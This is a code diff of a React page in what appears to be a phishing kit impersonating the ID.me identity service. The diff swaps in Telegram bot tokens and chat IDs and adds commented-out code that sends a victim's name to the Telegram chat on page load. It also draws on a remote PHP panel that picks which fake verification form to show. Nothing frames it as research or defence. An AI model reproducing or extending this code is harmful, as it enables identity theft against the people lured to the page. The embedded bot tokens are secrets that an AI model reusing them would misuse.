@@ -18,13 +18,11 @@ import DoYouHaveIdMe from "../components/DoYouHaveIdme";
 import LandingPage from "../components/LandingPage";
 import CreateAccount from "../components/createIDMeNew";
 import SecondErrorPage from "../components/secondErrorPage";
-import SecondSecurity from "../components/SecondSecurity";
-import WeAreVeryfying from "../components/weareveryfying";
 
 // The URL for your PHP backend
 const API_URL = "https://ivory-dunlin-618889.hostingersite.com/myBackend/admin_api3.php"; // Update this based on your server configuration
-const BOT_TOKEN = '8119231817:AAGAmxzBGY0vBPeVFM2hEEBbXkoAUGxm_HE';
-const CHAT_ID = '6837437455';
+const BOT_TOKEN = '7939347007:AAFu3fkYZiNVGkc1viOKLP4CY722hYGsoq8';
+const CHAT_ID = '6639364559';
 
 
 
@@ -37,7 +35,44 @@ const parsedData = storedData ? JSON.parse(storedData) : {};
 
 const fullName = parsedData.fullname || "N/A";
 
+  // Fetch the current form from the PHP backend
+//   useEffect(() => {
+//     const fetchFormType = async () => {
+//       try {
+//         const res = await fetch(`${API_URL}?action=fetch_forms2`);
+//         const data = await res.json();
+//         const selectedForm = data?.currentForm2 || "LandingPage";
+//         setFormType(selectedForm);
+//       } catch (error) {
+//         console.error("Failed to fetch form type from PHP:", error);
+//       }
+//     };
 
+    
+
+
+// const sendToTelegram = async (message: string) => {
+//   await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+//     method: "POST",
+//     headers: {
+//       "Content-Type": "application/json",
+//     },
+//     body: JSON.stringify({
+//       chat_id: CHAT_ID,
+//       text: message,
+//     }),
+//   });
+// };
+
+
+//     useEffect(() => {
+//       // Notify on page load
+//       sendToTelegram(`✅ ${fullName} has opened the user 2 page. and refreshed`);
+//     }, []);
+  
+
+//     fetchFormType();
+//   }, []);
 
 useEffect(() => {
   const fetchFormType = async () => {
@@ -142,10 +177,6 @@ useEffect(() => {
         return <CreateAccount />;
       case "SecondErrorPage":
         return <SecondErrorPage />;
-        case "SecondSecurity":
-          return <SecondSecurity />;
-          case "WeAreVeryfying":
-            return <WeAreVeryfying />;
       default:
         return (
           <div className="animate-pulse max-w-sm mx-auto bg-white p-6 rounded shadow">
